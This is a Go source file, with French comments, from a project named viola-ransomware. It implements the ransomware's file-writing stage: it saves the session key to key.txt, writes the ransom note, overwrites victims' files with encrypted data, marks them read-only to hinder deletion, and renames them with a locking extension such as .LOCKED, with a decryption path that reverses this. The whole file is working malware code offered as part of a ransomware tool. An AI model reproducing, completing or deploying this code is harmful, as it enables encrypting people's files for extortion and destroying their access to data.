package readwrite

import (
	"fmt"
	"os"
	"strings"
	"viola-ransomware/config"
)

// SaveKey enregistre la clé de session de manière sécurisée (lecture/écriture propriétaire uniquement).
func SaveKey(key string) error {
	// Utilisation de 0600 : Seul l'utilisateur actuel peut lire ce fichier
	err := os.WriteFile("key.txt", []byte(key), 0600)
	if err != nil {
		return fmt.Errorf("impossible de sauvegarder la clé : %w", err)
	}
	return nil
}

// WriteFilesNoExt écrit des fichiers sans changer l'extension (ex: la note de rançon).
func WriteFilesNoExt(data string, path string) bool {
	return os.WriteFile(path, []byte(data), 0644) == nil
}

// WriteFiles gère l'écriture des données chiffrées/déchiffrées et le renommage.
func WriteFiles(data []byte, path string, decrypt bool) bool {
	// 1. Définition des permissions
	// En chiffrement, on peut mettre 0444 (lecture seule) pour compliquer la suppression.
	// En déchiffrement, on remet 0644 (normal).
	var perm os.FileMode = 0444
	if decrypt {
		perm = 0644
	}

	// 2. Écriture des données brutes
	if err := os.WriteFile(path, data, perm); err != nil {
		return false
	}

	// 3. Calcul du nouveau nom de fichier
	var newPath string
	if decrypt {
		// Supprime l'extension (ex: .LOCKED)
		newPath = strings.TrimSuffix(path, config.ChangedToExtensions)
	} else {
		// Ajoute l'extension (ex: .LOCKED)
		newPath = path + config.ChangedToExtensions
	}

	// 4. Renommage atomique
	if err := os.Rename(path, newPath); err != nil {
		return false
	}

	return true
}